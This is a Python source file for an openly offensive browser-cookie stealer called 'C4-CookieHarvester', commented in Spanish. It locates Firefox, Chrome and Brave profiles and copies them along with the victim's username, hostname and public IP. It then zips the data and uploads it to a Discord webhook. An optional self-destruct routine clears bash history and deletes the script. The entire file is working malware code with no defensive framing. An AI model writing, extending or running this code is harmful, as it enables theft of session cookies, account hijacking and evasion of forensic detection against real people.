#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
C4-CookieHarvester v5.3.4 "Stable Light"
- Basado en v5.3.3 (división 8 MB, reintentos).
- Añade nombre único en ZIP y archivo info.txt.
- Soporte opcional para Chrome y Brave.
"""

# ============================================================
#                    IMPORTS Y VERIFICACIÓN
# ============================================================
from dotenv import load_dotenv # Cargar el .env
load_dotenv() # Leer el .env
import os          # Para manejar rutas y archivos
import sys         # Para salir del script (sys.exit)
import time        # Para pausas (sleep) y reintentos
import shutil      # Para copiar carpetas y eliminar archivos
import zipfile     # Para comprimir en ZIP
import tempfile    # Para crear directorios temporales
import subprocess  # Para ejecutar comandos del sistema (pgrep)
import socket      # Para obtener el nombre del equipo (hostname)
import getpass     # Para obtener el nombre del usuario
import glob        # Para buscar archivos con patrones (*.zip)
import traceback   # Para mostrar errores completos
from math import ceil      # Para redondear hacia arriba en la división
from datetime import datetime  # Para fechas y timestamps

# ------------------------------------------------------------
# VERIFICAR REQUESTS (SIN INSTALAR NADA)
# ------------------------------------------------------------
# 🔍 QUE HACE: Verifica si la librería 'requests' está instalada.
#    Si no está, muestra un mensaje de error y sale del script.
# 🖥️ CONSOLA: Muestra "[+] requests disponible" o mensaje de error.
# ------------------------------------------------------------
print("[DEBUG] === VERIFICANDO REQUESTS ===")
try:
    import requests
    REQUESTS_DISPONIBLE = True
    print("[+] Requests SI esta disponible")
    print(f"[DEBUG] Versión de requests: {requests.__version__}")
except ImportError:
    REQUESTS_DISPONIBLE = False
    print("[!] Requests NO esta disponible")

def Requests_NOT(fallo, temp_dir, script_path):
    try:
        try:
            if not REQUESTS_DISPONIBLE:
                raise ImportError(" Requests no esta disponible")
            print("[DEBUG] Requests verificado correctamente (global)")
            return False
        except ImportError:          
            print("[!] Error: requests no está instalado.")
            print("[!] Instala manualmente con: pip install --user requests")
            print("[!] O con: sudo pip install requests (si tienes permisos)")
            return True

        if temp_dir and os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)
            print(f"[+] Eliminado: {temp_dir}")
        
        # 2. Limpiar historial de bash
            os.system('history -c 2>/dev/null')
            os.system('history -w 2>/dev/null')
            os.system('cat /dev/null > ~/.bash_history 2>/dev/null')
        
        # 3. Eliminar el script
            time.sleep(1)
            if os.path.exists(script_path):
                os.remove(script_path)
                print(f"[+] Eliminado: {script_path}")
        
        # 4. Eliminar cualquier archivo .pyc
            pyc_file = f"{script_path}c"
            if os.path.exists(pyc_file):
                os.remove(pyc_file)
        
            print("[+] Autodestrucción completada")
            sys.exit(0)

    except Exception as e:
            print(f"[!] Error en autodestrucción: {e}")
            traceback.print_exc()
            return True
       

# ============================================================
#                  CONFIGURACIÓN
# ============================================================
# 🔍 QUE HACE: Define las variables de configuración globales
# 🖥️ CONSOLA: NO se muestra nada (solo configuración interna)
# ============================================================

DISCORD_WEBHOOK_URL = os.getenv("API_Discord")
MAX_SIZE_MB = 8
AUTODESTRUIR = False
SOPORTE_CHROME = False

if not DISCORD_WEBHOOK_URL:
    raise ValueError("No hay API de Discord en .env")

# ============================================================
#               DETECCIÓN DE NAVEGADORES ABIERTOS
# ============================================================
# 🔍 QUE HACE: Detecta si un navegador específico está en ejecución
# 🖥️ CONSOLA: NO se muestra (función interna, solo retorna True/False)
# ============================================================
def navegador_abierto(nombre_proceso):
    """Verifica si un proceso (navegador) está en ejecución usando pgrep"""
    try:
        resultado = subprocess.run(['pgrep', '-x', nombre_proceso], capture_output=True, text=True)
        return resultado.returncode == 0
    except:
        return False

# ------------------------------------------------------------
# DETECTAR NAVEGADORES ABIERTOS
# ------------------------------------------------------------
# 🔍 QUE HACE: Recorre una lista de navegadores y verifica cuáles están abiertos
# 🖥️ CONSOLA: NO se muestra (retorna lista de nombres)
# ------------------------------------------------------------
def detectar_navegadores_abiertos():
    """Detecta qué navegadores están abiertos actualmente"""
    procesos = {
        'firefox': 'Firefox',
        'chrome': 'Chrome',
        'chromium': 'Chromium',
        'brave': 'Brave',
        'microsoft-edge': 'Edge',
    }
    abiertos = []
    for proc, nombre in procesos.items():
        if navegador_abierto(proc):
            abiertos.append(nombre)
    return abiertos

# ============================================================
#               LOCALIZACIÓN DE PERFILES
# ============================================================
# 🔍 QUE HACE: Busca las carpetas de perfiles de Firefox/Chrome/Brave
# 🖥️ CONSOLA: NO se muestra (retorna la ruta o None)
# ============================================================
def encontrar_perfil_firefox():
    """Busca el perfil de Firefox con cookies.sqlite"""
    base = os.path.expanduser('~')
    rutas_posibles = [
        os.path.join(base, '.mozilla', 'firefox'),
        os.path.join(base, '.config', 'mozilla', 'firefox'),
        os.path.join(base, '.config', '.mozilla', 'firefox'),
        os.path.join(base, '.var', 'app', 'org.mozilla.firefox', '.mozilla', 'firefox'),
        os.path.join(base, 'snap', 'firefox', 'common', '.mozilla', 'firefox'),
    ]
    for ruta_base in rutas_posibles:
        if not os.path.exists(ruta_base):
            continue
        for perfil in os.listdir(ruta_base):
            if perfil.endswith('.default-release') or perfil.endswith('.default'):
                ruta_perfil = os.path.join(ruta_base, perfil)
                if os.path.exists(os.path.join(ruta_perfil, 'cookies.sqlite')):
                    return ruta_perfil
    return None

def encontrar_perfil_chrome():
    """Busca el perfil de Chrome (solo si SOPORTE_CHROME es True)"""
    if not SOPORTE_CHROME:
        return None
    base = os.path.expanduser('~')
    rutas = [
        os.path.join(base, '.config', 'google-chrome', 'Default'),
        os.path.join(base, '.var', 'app', 'com.google.Chrome', 'config', 'google-chrome', 'Default'),
    ]
    for ruta in rutas:
        if os.path.exists(os.path.join(ruta, 'Network', 'Cookies')):
            return ruta
    return None

def encontrar_perfil_brave():
    """Busca el perfil de Brave (solo si SOPORTE_CHROME es True)"""
    if not SOPORTE_CHROME:
        return None
    base = os.path.expanduser('~')
    ruta = os.path.join(base, '.config', 'BraveSoftware', 'Brave-Browser', 'Default')
    if os.path.exists(os.path.join(ruta, 'Network', 'Cookies')):
        return ruta
    return None

# ============================================================
#               COPIA DE CARPETA COMPLETA
# ============================================================
# 🔍 QUE HACE: Copia una carpeta completa a otro destino
# 🖥️ CONSOLA: Muestra errores si falla la copia
# ============================================================
def copiar_carpeta(origen, destino):
    """
    Copia una carpeta completa usando shutil.copytree
    Retorna True si tuvo éxito, False si falló
    """
    try:
        if os.path.exists(destino):
            shutil.rmtree(destino)
        shutil.copytree(origen, destino, symlinks=False, ignore_dangling_symlinks=True)
        return True
    except Exception as e:
        print(f"    [!] Error copiando: {e}")
        return False

# ============================================================
#               CREACIÓN DE INFO.TXT
# ============================================================
# 🔍 QUE HACE: Crea un archivo info.txt con datos del objetivo
# 🖥️ CONSOLA: NO se muestra (escribe en el archivo)
# ============================================================
def crear_info_txt(destino, ip_publica, navegadores_abiertos, navegador_nombre):
    """Crea un archivo info.txt con información del objetivo"""
    with open(destino, 'w') as f:
        f.write("=" * 50 + "\n")
        f.write("  C4-CookieHarvester - Información del objetivo\n")
        f.write("=" * 50 + "\n")
        f.write(f"Usuario: {getpass.getuser()}\n")
        f.write(f"Equipo: {socket.gethostname()}\n")
        f.write(f"Sistema: {sys.platform}\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"IP Pública: {ip_publica}\n")
        f.write(f"Navegador: {navegador_nombre}\n")
        f.write(f"Navegadores abiertos: {', '.join(navegadores_abiertos) if navegadores_abiertos else 'Ninguno'}\n")

# ============================================================
#               COMPRESIÓN Y DIVISIÓN
# ============================================================
# 🔍 QUE HACE: Comprime una carpeta en ZIP y la divide en partes de MAX_SIZE_MB
# 🖥️ CONSOLA: NO se muestra (procesa archivos internamente)
# ============================================================
def crear_zip_desde_carpeta(carpeta_origen, zip_destino):
    """Comprime una carpeta en un archivo ZIP"""
    with zipfile.ZipFile(zip_destino, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, _, files in os.walk(carpeta_origen):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.relpath(full_path, carpeta_origen)
                zf.write(full_path, arcname)
    return zip_destino

def dividir_zip_en_partes(zip_path, max_size_mb=8):
    """
    Divide un ZIP en partes de max_size_mb MB
    Retorna una lista con las rutas de las partes
    """
    max_bytes = max_size_mb * 1024 * 1024
    file_size = os.path.getsize(zip_path)
    
    if file_size <= max_bytes:
        return [zip_path]
    
    parts = []
    base_name = os.path.splitext(zip_path)[0]
    with open(zip_path, 'rb') as f:
        data = f.read()
    
    total_parts = ceil(file_size / max_bytes)
    for i in range(total_parts):
        part_path = f"{base_name}_part{i+1}.zip"
        with open(part_path, 'wb') as pf:
            pf.write(data[i*max_bytes:(i+1)*max_bytes])
        parts.append(part_path)
    return parts

# ============================================================
#               ENVÍO A DISCORD (CON CONFIRMACIÓN Y LOGS)
# ============================================================
# 🔍 QUE HACE: Envía mensajes a Discord y retorna True/False según éxito
# 🖥️ CONSOLA: MUESTRA TODOS LOS LOGS DETALLADOS
# ============================================================
def info_objetivo(webhook_url, usuario, equipo, ip_publica, fecha, perfiles_procesados, total_partes_enviadas, errores):
    """
    Envía un mensaje de "objetivo nuevo" a Discord
    Retorna True si se envió correctamente (status 200 o 204)
    """
    try:
        print("\n[DEBUG] === INFO_OBJETIVO ===")
        print(f"[DEBUG] Webhook: {webhook_url[:60]}...")
        print(f"[DEBUG] Usuario: {usuario}")
        print(f"[DEBUG] Equipo: {equipo}")
        print(f"[DEBUG] IP: {ip_publica}")
        
        resumen = f"""
========================================
CookieHarvester tiene un objetivo nuevo
========================================
Informacion
------------
Usuario: {usuario}
Equipo: {equipo}
IP: {ip_publica}
Fecha: {fecha}
Perfiles: {len(perfiles_procesados)}
Partes apunto de llegar: {total_partes_enviadas}
Errores: {'Sí' if errores else 'No'}
"""
        print(f"[DEBUG] Mensaje (primeros 100 chars): {resumen[:100].replace(chr(10), ' ')}...")
        
        print("[DEBUG] Enviando POST a Discord...")
        response = requests.post(webhook_url, data={'content': resumen[:1900]}, timeout=10)
        
        print(f"[DEBUG] Código de respuesta: {response.status_code}")
        print(f"[DEBUG] Respuesta del servidor: {response.text[:200]}")
        
        if response.status_code in [200, 204]:
            print("[DEBUG] ✅ Mensaje 'objetivo nuevo' enviado correctamente")
            return True
        else:
            print(f"[DEBUG] ❌ Falló con código {response.status_code}")
            return False
            
    except Exception as e:
        print(f"[!] ERROR en info_objetivo: {e}")
        print(f"[!] Tipo de error: {type(e).__name__}")
        traceback.print_exc()
        return False

def enviar_a_discord(webhook_url, zip_path, caption=None, intento=1, max_intentos=3):
    """
    Envía un archivo ZIP a Discord con reintentos
    Retorna True si se envió correctamente
    """
    try:
        print(f"\n[DEBUG] === ENVIAR_A_DISCORD (Intento {intento}/{max_intentos}) ===")
        print(f"[DEBUG] Archivo: {zip_path}")
        print(f"[DEBUG] Caption: {caption[:60] if caption else 'None'}...")
        
        if not os.path.exists(zip_path):
            print(f"[!] ERROR: El archivo {zip_path} NO EXISTE")
            return False
        
        file_size = os.path.getsize(zip_path)
        print(f"[DEBUG] Tamaño: {file_size} bytes ({file_size/1024/1024:.2f} MB)")
        
        with open(zip_path, 'rb') as f:
            files = {'file': (os.path.basename(zip_path), f, 'application/zip')}
            data = {}
            if caption:
                data['content'] = caption[:1000]
            
            print("[DEBUG] Enviando POST con archivo...")
            response = requests.post(webhook_url, files=files, data=data, timeout=30)
            
            print(f"[DEBUG] Código de respuesta: {response.status_code}")
            print(f"[DEBUG] Respuesta del servidor: {response.text[:200]}")
            
            if response.status_code in [200, 204]:
                print("[DEBUG] ✅ Archivo enviado correctamente")
                return True
            elif response.status_code == 429:
                print("[DEBUG] ⚠️ Rate limit (429)")
                if intento < max_intentos:
                    wait_time = 2 ** intento
                    print(f"[DEBUG] Esperando {wait_time}s...")
                    time.sleep(wait_time)
                    return enviar_a_discord(webhook_url, zip_path, caption, intento+1, max_intentos)
                return False
            else:
                print(f"[DEBUG] ❌ Falló con código {response.status_code}")
                if intento < max_intentos:
                    wait_time = 2 ** intento
                    print(f"[DEBUG] Reintentando en {wait_time}s...")
                    time.sleep(wait_time)
                    return enviar_a_discord(webhook_url, zip_path, caption, intento+1, max_intentos)
                return False
                    
    except Exception as e:
        print(f"[!] ERROR en enviar_a_discord: {e}")
        print(f"[!] Tipo de error: {type(e).__name__}")
        traceback.print_exc()
        
        if intento < max_intentos:
            wait_time = 2 ** intento
            print(f"[DEBUG] Reintentando en {wait_time}s...")
            time.sleep(wait_time)
            return enviar_a_discord(webhook_url, zip_path, caption, intento+1, max_intentos)
        return False

def enviar_resumen_final(webhook_url, info_objetivo_dict, perfiles_procesados, total_partes_enviadas, errores):
    """
    Envía el resumen final de ejecución a Discord
    Retorna True si se envió correctamente
    """
    try:
        print("\n[DEBUG] === ENVIAR_RESUMEN_FINAL ===")
        print(f"[DEBUG] Usuario: {info_objetivo_dict.get('usuario', 'N/A')}")
        print(f"[DEBUG] Perfiles procesados: {len(perfiles_procesados)}")
        print(f"[DEBUG] Partes enviadas: {total_partes_enviadas}")
        print(f"[DEBUG] Errores: {errores}")
        
        resumen = f"""
📊 RESUMEN DE EJECUCIÓN
Usuario: {info_objetivo_dict['usuario']}
Equipo: {info_objetivo_dict['equipo']}
IP: {info_objetivo_dict['ip_publica']}
Fecha: {info_objetivo_dict['fecha']}
Perfiles: {len(perfiles_procesados)}
Partes enviadas: {total_partes_enviadas}
Errores: {'Sí' if errores else 'No'}
"""
        print(f"[DEBUG] Mensaje (primeros 100 chars): {resumen[:100].replace(chr(10), ' ')}...")
        
        print("[DEBUG] Enviando POST...")
        response = requests.post(webhook_url, data={'content': resumen[:1900]}, timeout=10)
        
        print(f"[DEBUG] Código de respuesta: {response.status_code}")
        print(f"[DEBUG] Respuesta: {response.text[:200]}")
        
        if response.status_code in [200, 204]:
            print("[DEBUG] ✅ Resumen final enviado")
            return True
        else:
            print(f"[DEBUG] ❌ Falló con código {response.status_code}")
            return False
            
    except Exception as e:
        print(f"[!] ERROR en enviar_resumen_final: {e}")
        print(f"[!] Tipo de error: {type(e).__name__}")
        traceback.print_exc()
        return False

# ============================================================
#               PROCESAR UN PERFIL
# ============================================================
# 🔍 QUE HACE: Procesa un perfil completo (copia, comprime, envía)
# 🖥️ CONSOLA: Muestra errores de copia si ocurren
# ============================================================
def procesar_perfil(perfil_path, nombre_navegador, temp_dir, ip_publica, navegadores_abiertos):
    """
    Procesa un perfil de navegador:
    1. Copia la carpeta del perfil
    2. Añade info.txt
    3. Comprime en ZIP
    4. Divide y envía a Discord
    Retorna True si todas las partes se enviaron correctamente
    """
    print(f"\n[DEBUG] === PROCESAR_PERFIL: {nombre_navegador} ===")
    print(f"[DEBUG] Ruta del perfil: {perfil_path}")
    
    carpeta_copia = os.path.join(temp_dir, f"{nombre_navegador}_perfil")
    print(f"[DEBUG] Carpeta de copia: {carpeta_copia}")
    
    if not copiar_carpeta(perfil_path, carpeta_copia):
        print(f"[!] Error al copiar perfil de {nombre_navegador}")
        return False

    info_path = os.path.join(carpeta_copia, "info.txt")
    crear_info_txt(info_path, ip_publica, navegadores_abiertos, nombre_navegador)

    fecha = datetime.now().strftime('%Y-%m-%d')
    nombre_base = f"{ip_publica.replace('.', '_')}_{getpass.getuser()}_{socket.gethostname()}_{fecha}_{nombre_navegador}"
    zip_path = os.path.join(temp_dir, f"{nombre_base}.zip")
    print(f"[DEBUG] ZIP creado en: {zip_path}")
    
    crear_zip_desde_carpeta(carpeta_copia, zip_path)
    print(f"[DEBUG] Tamaño del ZIP: {os.path.getsize(zip_path)} bytes")

    parts = dividir_zip_en_partes(zip_path, MAX_SIZE_MB)
    print(f"[DEBUG] Partes generadas: {len(parts)}")
    
    exitos = 0
    for idx, part in enumerate(parts, 1):
        print(f"\n[DEBUG] --- Enviando parte {idx}/{len(parts)} ---")
        caption = f"📁 **{nombre_navegador}** - Parte {idx}/{len(parts)} | {nombre_base}"
        if enviar_a_discord(DISCORD_WEBHOOK_URL, part, caption):
            exitos += 1
            print(f"[DEBUG] ✅ Parte {idx} enviada correctamente")
        else:
            print(f"[DEBUG] ❌ Parte {idx} falló")
        time.sleep(1)
    
    resultado = exitos == len(parts)
    print(f"[DEBUG] Resultado final para {nombre_navegador}: {'✅ Éxito' if resultado else '❌ Falló'}")
    return resultado

# ============================================================
#           VERIFICACIÓN DE FUNCIONES REQUERIDAS
# ============================================================
# 🔍 QUE HACE: Verifica que todas las funciones necesarias existan
# 🖥️ CONSOLA: Muestra error si falta alguna función
# ============================================================
def verificar_funciones():
    """Verifica que todas las funciones necesarias estén definidas"""
    funciones_requeridas = [
        'procesar_perfil',
        'copiar_carpeta',
        'crear_info_txt',
        'crear_zip_desde_carpeta',
        'dividir_zip_en_partes',
        'enviar_a_discord',
        'enviar_resumen_final'
    ]
    
    for func in funciones_requeridas:
        if func not in globals():
            print(f"[!] Error: La función '{func}' no está definida.")
            return False
    return True

# ============================================================
#               AUTODESTRUCCIÓN (CON CONFIRMACIÓN DE ENVÍOS)
# ============================================================
# 🔍 QUE HACE: Elimina el script y archivos temporales SOLO después de confirmar envíos
# 🖥️ CONSOLA: Muestra el proceso de autodestrucción
# ============================================================
def autodestruir_seguro(temp_dir, script_path, mensajes_enviados):
    """
    Autodestrucción solo después de confirmar que todos los mensajes se enviaron.
    
    Args:
        temp_dir: Directorio temporal a eliminar
        script_path: Ruta del script actual
        mensajes_enviados: Diccionario con estado de cada envío
    """
    try:
        print("\n[DEBUG] === AUTODESTRUIR_SEGURO ===")
        print(f"[DEBUG] temp_dir: {temp_dir}")
        print(f"[DEBUG] script_path: {script_path}")
        print(f"[DEBUG] mensajes_enviados: {mensajes_enviados}")
        
        print("\n[*] Verificando envíos antes de autodestruir...")
        
        todos_exitosos = all(mensajes_enviados.values())
        print(f"[DEBUG] Todos los mensajes enviados correctamente: {todos_exitosos}")
        
        if not todos_exitosos:
            print("[!] Algunos mensajes no se enviaron correctamente:")
            for nombre, estado in mensajes_enviados.items():
                print(f"    - {nombre}: {'✅ Enviado' if estado else '❌ Falló'}")
            print("[*] Esperando 10 segundos antes de autodestruir...")
            time.sleep(10)
        
        print("[*] Iniciando autodestrucción...")
        
        if temp_dir and os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)
            print(f"[+] Eliminado: {temp_dir}")
        
        os.system('history -c 2>/dev/null')
        os.system('history -w 2>/dev/null')
        os.system('cat /dev/null > ~/.bash_history 2>/dev/null')
        
        time.sleep(1)
        if os.path.exists(script_path):
            os.remove(script_path)
            print(f"[+] Eliminado: {script_path}")
        
        pyc_file = f"{script_path}c"
        if os.path.exists(pyc_file):
            os.remove(pyc_file)
            print(f"[+] Eliminado: {pyc_file}")
        
        print("[+] Autodestrucción completada")
        sys.exit(0)
        
    except Exception as e:
        print(f"[!] Error en autodestrucción: {e}")
        traceback.print_exc()
        sys.exit(1)

# ============================================================
#                     FUNCIÓN PRINCIPAL
# ============================================================
# 🔍 QUE HACE: Orquesta todo el proceso
# 🖥️ CONSOLA: MUESTRA TODO EL PROGRESO EN CONSOLA
# ============================================================
def main():
    print("\n[DEBUG] === INICIO DE MAIN ===")
    
    # ============================================================
    # AUTODESTRUCCIÓN sino existe Requests
    # ============================================================
    script_path = os.path.abspath(__file__)
    print(f"[DEBUG] script_path: {script_path}")
    print(f"[DEBUG] REQUESTS_DISPONIBLE: {REQUESTS_DISPONIBLE}")
    
    # Verificar que requests realmente funciona
    try:
        print("[DEBUG] Probando requests.get()...")
        test_response = requests.get('https://api.ipify.org', timeout=3)
        print(f"[DEBUG] ✅ requests.get() funciona. IP test: {test_response.text[:20]}")
    except Exception as e:
        print(f"[!] ERROR: requests.get() NO funciona: {e}")
        traceback.print_exc()

    if not Requests_NOT(False, None, script_path):
        print("[DEBUG] Requests_NOT retornó False (requests disponible) -> continuando")
        pass
    else:
        print("[DEBUG] Requests_NOT retornó True (requests NO disponible) -> saliendo")
        sys.exit(1)
    
    # Verificar funciones requeridas
    if not verificar_funciones():
        print("[DEBUG] verificar_funciones falló")
        sys.exit(1)
    print("[DEBUG] verificar_funciones OK")
    
    # ============================================================
    # INICIO DEL SCRIPT (TODO ESTO SE MUESTRA EN CONSOLA)
    # ============================================================
    print("=" * 60)
    print("  C4-CookieHarvester v5.3.4 - STABLE LIGHT")
    print("=" * 60)

    usuario = getpass.getuser()
    equipo = socket.gethostname()
    print(f"[+] Objetivo: {usuario}@{equipo}")

    # Obtener IP pública
    try:
        print("[DEBUG] Obteniendo IP pública...")
        ip_publica = requests.get('https://api.ipify.org', timeout=5).text
        print(f"[+] IP Pública: {ip_publica}")
        print(f"[DEBUG] IP obtenida: {ip_publica}")
    except Exception as e:
        ip_publica = "No disponible"
        print("[+] IP Pública: No disponible")
        print(f"[!] Error obteniendo IP: {e}")

    # Detectar navegadores abiertos
    print("[DEBUG] Detectando navegadores abiertos...")
    abiertos = detectar_navegadores_abiertos()
    print(f"[DEBUG] Navegadores abiertos: {abiertos}")
    if abiertos:
        print(f"⚠️  Navegadores ABIERTOS: {', '.join(abiertos)}")
    else:
        print("✅ No hay navegadores abiertos.")

    # Crear directorio temporal
    temp_dir = tempfile.mkdtemp(prefix="c4_")
    print(f"[+] Directorio temporal: {temp_dir}")
    print(f"[DEBUG] temp_dir creado: {temp_dir}")

    # ============================================================
    # BUSCAR PERFILES
    # ============================================================
    print("[DEBUG] Buscando perfiles...")
    perfiles = []
    firefox_path = encontrar_perfil_firefox()
    if firefox_path:
        perfiles.append((firefox_path, "Firefox"))
        print(f"[DEBUG] Firefox encontrado en: {firefox_path}")

    if SOPORTE_CHROME:
        chrome_path = encontrar_perfil_chrome()
        if chrome_path:
            perfiles.append((chrome_path, "Chrome"))
            print(f"[DEBUG] Chrome encontrado en: {chrome_path}")
        brave_path = encontrar_perfil_brave()
        if brave_path:
            perfiles.append((brave_path, "Brave"))
            print(f"[DEBUG] Brave encontrado en: {brave_path}")

    if not perfiles:
        print("[!] No se encontraron perfiles de navegadores.")
        print("[DEBUG] Saliendo por falta de perfiles")
        sys.exit(1)

    print(f"\n[+] Perfiles encontrados: {len(perfiles)}")
    for path, nombre in perfiles:
        print(f"    - {nombre}: {path}")

    # ============================================================
    # ENVÍO De inicio a Discord
    # ============================================================
    fecha = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    print(f"[DEBUG] Fecha/hora: {fecha}")
    
    print("\n[*] Enviando mensajes de confirmación a Discord...")

    perfiles_procesados = []
    total_partes_enviadas = 0
    errores_globales = False

    print("\n [*] Enviando info de nuevo objetivo a Discord")
    
    info_exitoso = info_objetivo(
        webhook_url=DISCORD_WEBHOOK_URL,
        usuario=usuario,
        equipo=equipo,
        ip_publica=ip_publica,
        fecha=fecha,
        perfiles_procesados=perfiles_procesados,
        total_partes_enviadas=total_partes_enviadas,
        errores=errores_globales
    )
    print(f"    Mensaje 'objetivo nuevo': {'✅ Enviado' if info_exitoso else '❌ Falló'}")
    print(f"[DEBUG] info_exitoso = {info_exitoso}")

    # ============================================================
    # PROCESAR CADA PERFIL
    # ============================================================
    for perfil_path, nombre in perfiles:
        print(f"\n[*] Procesando: {nombre}")
        print(f"[DEBUG] Procesando perfil: {nombre} en {perfil_path}")
        exito = procesar_perfil(perfil_path, nombre, temp_dir, ip_publica, abiertos)
        print(f"[DEBUG] Resultado de procesar_perfil para {nombre}: {exito}")
        
        fecha_zip = datetime.now().strftime('%Y-%m-%d')
        nombre_base = f"{ip_publica.replace('.', '_')}_{usuario}_{equipo}_{fecha_zip}_{nombre}"
        zip_base = os.path.join(temp_dir, f"{nombre_base}.zip")
        print(f"[DEBUG] zip_base esperado: {zip_base}")
        
        partes = 1
        if os.path.exists(zip_base):
            print(f"[DEBUG] zip_base existe")
            parte_idx = 1
            while os.path.exists(os.path.join(temp_dir, f"{nombre_base}_part{parte_idx+1}.zip")):
                parte_idx += 1
            partes = parte_idx if parte_idx > 1 else 1
            print(f"[DEBUG] partes contadas desde zip_base: {partes}")
        else:
            print(f"[DEBUG] zip_base NO existe, buscando por glob...")
            partes_encontradas = glob.glob(os.path.join(temp_dir, f"{nombre_base}_part*.zip"))
            if partes_encontradas:
                partes = len(partes_encontradas)
                print(f"[DEBUG] partes encontradas por glob: {partes}")
            else:
                partes = 1
                print(f"[DEBUG] partes por defecto: 1")
        
        if exito:
            print(f"[+] {nombre} procesado correctamente.")
        else:
            print(f"[!] {nombre} tuvo errores.")
            errores_globales = True

        perfiles_procesados.append({
            'nombre': nombre,
            'partes': partes
        })
        total_partes_enviadas += partes
        print(f"[DEBUG] total_partes_enviadas acumulado: {total_partes_enviadas}")

    print(f"\n[DEBUG] perfiles_procesados final: {perfiles_procesados}")
    print(f"[DEBUG] errores_globales: {errores_globales}")

    # ============================================================
    # Enviar resumen final a Discord
    # ============================================================

    info_objetivo_dict = {
        'usuario': usuario,
        'equipo': equipo,
        'ip_publica': ip_publica,
        'fecha': fecha
    }
    print(f"[DEBUG] info_objetivo_dict: {info_objetivo_dict}")
    
    resumen_exitoso = enviar_resumen_final(
        webhook_url=DISCORD_WEBHOOK_URL,
        info_objetivo_dict=info_objetivo_dict,
        perfiles_procesados=perfiles_procesados,
        total_partes_enviadas=total_partes_enviadas,
        errores=errores_globales
    )
    print(f"    Resumen final: {'✅ Enviado' if resumen_exitoso else '❌ Falló'}")
    print(f"[DEBUG] resumen_exitoso = {resumen_exitoso}")

    # ============================================================
    # LIMPIEZA Y AUTODESTRUCCIÓN (SOLO DESPUÉS DE CONFIRMAR ENVÍOS)
    # ============================================================
    print("\n[DEBUG] === PRE-AUTODESTRUCCION ===")
    print(f"[DEBUG] info_exitoso: {info_exitoso}")
    print(f"[DEBUG] resumen_exitoso: {resumen_exitoso}")
    print(f"[DEBUG] perfiles_procesados: {len(perfiles_procesados)}")
    print(f"[DEBUG] total_partes_enviadas: {total_partes_enviadas}")
    print(f"[DEBUG] errores_globales: {errores_globales}")
    print(f"[DEBUG] AUTODESTRUIR: {AUTODESTRUIR}")
    
    if AUTODESTRUIR:
        mensajes_enviados = {
            'objetivo_nuevo': info_exitoso,
            'resumen_final': resumen_exitoso
        }
        print(f"[DEBUG] mensajes_enviados: {mensajes_enviados}")
        
        autodestruir_seguro(temp_dir, os.path.abspath(__file__), mensajes_enviados)
    else:
        if temp_dir and os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)
        print("\n[+] Limpieza completada.")
        print("=" * 60)

if __name__ == "__main__":
    main()
